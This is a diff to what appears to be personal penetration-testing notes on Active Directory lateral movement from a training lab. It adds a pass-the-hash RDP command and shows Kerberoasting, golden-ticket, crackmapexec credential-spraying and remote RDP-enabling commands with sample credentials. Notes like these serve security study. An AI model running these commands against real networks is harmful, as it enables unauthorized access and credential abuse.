@@ -301,7 +301,6 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
-#### Crackmapexec
 ```
 Failed logins result in a [-]
 Successful logins result in a [+] Domain\Username:Password
@@ -312,6 +311,7 @@ rdp(sometimes authentication not correct):
 proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
 proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE'(Admin privilege can turn on rdp on machine)
 proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82:port /cert-ignore
+xfreerdp /v:192.168.153.175 /cert-ignore /u:L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808
 
 smb(-x requires admin privilege):
 for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
